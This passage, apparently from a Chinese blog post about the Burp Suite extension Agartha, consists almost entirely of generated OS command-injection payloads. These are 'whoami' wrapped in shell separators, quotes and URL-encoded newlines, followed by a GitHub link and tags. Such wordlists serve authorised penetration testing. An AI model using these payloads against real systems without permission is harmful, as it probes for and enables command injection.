\n\'&&`whoami`\'
\n\'&&`whoami`&&\'
\n\'&&\'whoami
\n\"||whoami||\"
\n\"||whoami\"
\n\"||`whoami`||\"
\n\"||`whoami`\"
\n\"||\"whoami
\n\"|whoami|\"
\n\"|whoami\"
\n\"|`whoami`|\"
\n\"|`whoami`\"
\n\"|\"whoami
\n\";whoami\"
\n\";whoami;\"
\n\";`whoami`\"
\n\";`whoami`;\"
\n\";\"whoami
\n\"&whoami\"
\n\"&whoami&\"
\n\"&`whoami`\"
\n\"&`whoami`&\"
\n\"&\"whoami
\n\"&&whoami\"
\n\"&&whoami&&\"
\n\"&&`whoami`\"
\n\"&&`whoami`&&\"
\n\"&&\"whoami
\n;whoami;
\n;whoami
\n;`whoami`;
\n;`whoami`
\n'||whoami||'
\n'||whoami'
\n'||`whoami`||'
\n'||`whoami`'
\n'||'whoami
\n'|whoami|'
\n'|whoami'
\n'|`whoami`|'
\n'|`whoami`'
\n'|'whoami
\n';whoami;'
\n';whoami'
\n';`whoami`;'
\n';`whoami`'
\n';'whoami
\n'&whoami'
\n'&whoami&'
\n'&`whoami`'
\n'&`whoami`&'
\n'&'whoami
\n'&&whoami'
\n'&&whoami&&'
\n'&&`whoami`'
\n'&&`whoami`&&'
\n'&&'whoami
\n&whoami&
\n&whoami
\n&`whoami`&
\n&`whoami`
\n&&whoami&&
\n&&whoami
\n&&`whoami`&&
\n&&`whoami`
\n"||whoami||"
\n"||whoami"
\n"||`whoami`||"
\n"||`whoami`"
\n"||"whoami
\n"|whoami|"
\n"|whoami"
\n"|`whoami`|"
\n"|`whoami`"
\n"|"whoami
\n";whoami;"
\n";whoami"
\n";`whoami`;"
\n";`whoami`"
\n";"whoami
\n"&whoami&"
\n"&whoami"
\n"&`whoami`&"
\n"&`whoami`"
\n"&&whoami&&"
\n"&&whoami"
\n"&&`whoami`&&"
\n"&&`whoami`"
\n"&&"whoami
\n"&"whoami
\'||whoami||\'
\'||whoami\'
\'||`whoami`||\'
\'||`whoami`\'
\'||\'whoami
\'|whoami|\'
\'|whoami\'
\'|`whoami`|\'
\'|`whoami`\'
\'|\'whoami
\';whoami\'
\';whoami;\'
\';`whoami`\'
\';`whoami`;\'
\';\'whoami
\'&whoami\'
\'&whoami&\'
\'&`whoami`\'
\'&`whoami`&\'
\'&\'whoami
\'&&whoami\'
\'&&whoami&&\'
\'&&`whoami`\'
\'&&`whoami`&&\'
\'&&\'whoami
\"||whoami||\"
\"||whoami\"
\"||`whoami`||\"
\"||`whoami`\"
\"||\"whoami
\"|whoami|\"
\"|whoami\"
\"|`whoami`|\"
\"|`whoami`\"
\"|\"whoami
\";whoami\"
\";whoami;\"
\";`whoami`\"
\";`whoami`;\"
\";\"whoami
\"&whoami\"
\"&whoami&\"
\"&`whoami`\"
\"&`whoami`&\"
\"&\"whoami
\"&&whoami\"
\"&&whoami&&\"
\"&&`whoami`\"
\"&&`whoami`&&\"
\"&&\"whoami
;whoami;
;whoami
;`whoami`;
;`whoami`
'||whoami||'
'||whoami'
'||`whoami`||'
'||`whoami`'
'||'whoami
'|whoami|'
'|whoami'
'|`whoami`|'
'|`whoami`'
'|'whoami
';whoami;'
';whoami'
';`whoami`;'
';`whoami`'
';'whoami
'&whoami'
'&whoami&'
'&`whoami`'
'&`whoami`&'
'&'whoami
'&&whoami'
'&&whoami&&'
'&&`whoami`'
'&&`whoami`&&'
'&&'whoami
&whoami&
&whoami
&`whoami`&
&`whoami`
&&whoami&&
&&whoami
&&`whoami`&&
&&`whoami`
%0d%0a||whoami||
%0d%0a||whoami
%0d%0a||`whoami`||
%0d%0a||`whoami`
%0d%0a|whoami|
%0d%0a|whoami
%0d%0a|`whoami`|
%0d%0a|`whoami`
%0d%0awhoami
%0d%0a`whoami`
%0d%0a\'||whoami||\'
%0d%0a\'||whoami\'
%0d%0a\'||`whoami`||\'
%0d%0a\'||`whoami`\'
%0d%0a\'||\'whoami
%0d%0a\'|whoami|\'
%0d%0a\'|whoami\'
%0d%0a\'|`whoami`|\'
%0d%0a\'|`whoami`\'
%0d%0a\'|\'whoami
%0d%0a\';whoami\'
%0d%0a\';whoami;\'
%0d%0a\';`whoami`\'
%0d%0a\';`whoami`;\'
%0d%0a\';\'whoami
%0d%0a\'&whoami\'
%0d%0a\'&whoami&\'
%0d%0a\'&`whoami`\'
%0d%0a\'&`whoami`&\'
%0d%0a\'&\'whoami
%0d%0a\'&&whoami\'
%0d%0a\'&&whoami&&\'
%0d%0a\'&&`whoami`\'
%0d%0a\'&&`whoami`&&\'
%0d%0a\'&&\'whoami
%0d%0a\"||whoami||\"
%0d%0a\"||whoami\"
%0d%0a\"||`whoami`||\"
%0d%0a\"||`whoami`\"
%0d%0a\"||\"whoami
%0d%0a\"|whoami|\"
%0d%0a\"|whoami\"
%0d%0a\"|`whoami`|\"
%0d%0a\"|`whoami`\"
%0d%0a\"|\"whoami
%0d%0a\";whoami\"
%0d%0a\";whoami;\"
%0d%0a\";`whoami`\"
%0d%0a\";`whoami`;\"
%0d%0a\";\"whoami
%0d%0a\"&whoami\"
%0d%0a\"&whoami&\"
%0d%0a\"&`whoami`\"
%0d%0a\"&`whoami`&\"
%0d%0a\"&\"whoami
%0d%0a\"&&whoami\"
%0d%0a\"&&whoami&&\"
%0d%0a\"&&`whoami`\"
%0d%0a\"&&`whoami`&&\"
%0d%0a\"&&\"whoami
%0d%0a;whoami;
%0d%0a;whoami
%0d%0a;`whoami`;
%0d%0a;`whoami`
%0d%0a'||whoami||'
%0d%0a'||whoami'
%0d%0a'||`whoami`||'
%0d%0a'||`whoami`'
%0d%0a'||'whoami
%0d%0a'|whoami|'
%0d%0a'|whoami'
%0d%0a'|`whoami`|'
%0d%0a'|`whoami`'
%0d%0a'|'whoami
%0d%0a';whoami;'
%0d%0a';whoami'
%0d%0a';`whoami`;'
%0d%0a';`whoami`'
%0d%0a';'whoami
%0d%0a'&whoami'
%0d%0a'&whoami&'
%0d%0a'&`whoami`'
%0d%0a'&`whoami`&'
%0d%0a'&'whoami
%0d%0a'&&whoami'
%0d%0a'&&whoami&&'
%0d%0a'&&`whoami`'
%0d%0a'&&`whoami`&&'
%0d%0a'&&'whoami
%0d%0a&whoami&
%0d%0a&whoami
%0d%0a&`whoami`&
%0d%0a&`whoami`
%0d%0a&&whoami&&
%0d%0a&&whoami
%0d%0a&&`whoami`&&
%0d%0a&&`whoami`
%0d%0a"||whoami||"
%0d%0a"||whoami"
%0d%0a"||`whoami`||"
%0d%0a"||`whoami`"
%0d%0a"||"whoami
%0d%0a"|whoami|"
%0d%0a"|whoami"
%0d%0a"|`whoami`|"
%0d%0a"|`whoami`"
%0d%0a"|"whoami
%0d%0a";whoami;"
%0d%0a";whoami"
%0d%0a";`whoami`;"
%0d%0a";`whoami`"
%0d%0a";"whoami
%0d%0a"&whoami&"
%0d%0a"&whoami"
%0d%0a"&`whoami`&"
%0d%0a"&`whoami`"
%0d%0a"&&whoami&&"
%0d%0a"&&whoami"
%0d%0a"&&`whoami`&&"
%0d%0a"&&`whoami`"
%0d%0a"&&"whoami
%0d%0a"&"whoami
%0a||whoami||
%0a||whoami
%0a||`whoami`||
%0a||`whoami`
%0a|whoami|
%0a|whoami
%0a|`whoami`|
%0a|`whoami`
%0awhoami
%0a`whoami`
%0a\'||whoami||\'
%0a\'||whoami\'
%0a\'||`whoami`||\'
%0a\'||`whoami`\'
%0a\'||\'whoami
%0a\'|whoami|\'
%0a\'|whoami\'
%0a\'|`whoami`|\'
%0a\'|`whoami`\'
%0a\'|\'whoami
%0a\';whoami\'
%0a\';whoami;\'
%0a\';`whoami`\'
%0a\';`whoami`;\'
%0a\';\'whoami
%0a\'&whoami\'
%0a\'&whoami&\'
%0a\'&`whoami`\'
%0a\'&`whoami`&\'
%0a\'&\'whoami
%0a\'&&whoami\'
%0a\'&&whoami&&\'
%0a\'&&`whoami`\'
%0a\'&&`whoami`&&\'
%0a\'&&\'whoami
%0a\"||whoami||\"
%0a\"||whoami\"
%0a\"||`whoami`||\"
%0a\"||`whoami`\"
%0a\"||\"whoami
%0a\"|whoami|\"
%0a\"|whoami\"
%0a\"|`whoami`|\"
%0a\"|`whoami`\"
%0a\"|\"whoami
%0a\";whoami\"
%0a\";whoami;\"
%0a\";`whoami`\"
%0a\";`whoami`;\"
%0a\";\"whoami
%0a\"&whoami\"
%0a\"&whoami&\"
%0a\"&`whoami`\"
%0a\"&`whoami`&\"
%0a\"&\"whoami
%0a\"&&whoami\"
%0a\"&&whoami&&\"
%0a\"&&`whoami`\"
%0a\"&&`whoami`&&\"
%0a\"&&\"whoami
%0a;whoami;
%0a;whoami
%0a;`whoami`;
%0a;`whoami`
%0a'||whoami||'
%0a'||whoami'
%0a'||`whoami`||'
%0a'||`whoami`'
%0a'||'whoami
%0a'|whoami|'
%0a'|whoami'
%0a'|`whoami`|'
%0a'|`whoami`'
%0a'|'whoami
%0a';whoami;'
%0a';whoami'
%0a';`whoami`;'
%0a';`whoami`'
%0a';'whoami
%0a'&whoami'
%0a'&whoami&'
%0a'&`whoami`'
%0a'&`whoami`&'
%0a'&'whoami
%0a'&&whoami'
%0a'&&whoami&&'
%0a'&&`whoami`'
%0a'&&`whoami`&&'
%0a'&&'whoami
%0a&whoami&
%0a&whoami
%0a&`whoami`&
%0a&`whoami`
%0a&&whoami&&
%0a&&whoami
%0a&&`whoami`&&
%0a&&`whoami`
%0a"||whoami||"
%0a"||whoami"
%0a"||`whoami`||"
%0a"||`whoami`"
%0a"||"whoami
%0a"|whoami|"
%0a"|whoami"
%0a"|`whoami`|"
%0a"|`whoami`"
%0a"|"whoami
%0a";whoami;"
%0a";whoami"
%0a";`whoami`;"
%0a";`whoami`"
%0a";"whoami
%0a"&whoami&"
%0a"&whoami"
%0a"&`whoami`&"
%0a"&`whoami`"
%0a"&&whoami&&"
%0a"&&whoami"
%0a"&&`whoami`&&"
%0a"&&`whoami`"
%0a"&&"whoami
%0a"&"whoami
"||whoami||"
"||whoami"
"||`whoami`||"
"||`whoami`"
"||"whoami
"|whoami|"
"|whoami"
"|`whoami`|"
"|`whoami`"
"|"whoami
";whoami;"
";whoami"
";`whoami`;"
";`whoami`"
";"whoami
"&whoami&"
"&whoami"
"&`whoami`&"
"&`whoami`"
"&&whoami&&"
"&&whoami"
"&&`whoami`&&"
"&&`whoami`"
"&&"whoami
"&"whoami
```

等等…

## 项目地址:

GitHub:

https://github.com/volkandindar/agartha

**转载请注明出处及链接**

[burpsuite](javascript:void(0))[渗透测试](javascript:void(0))[黑客工具](javascript:void(0))[黑客技术](javascript:void(0))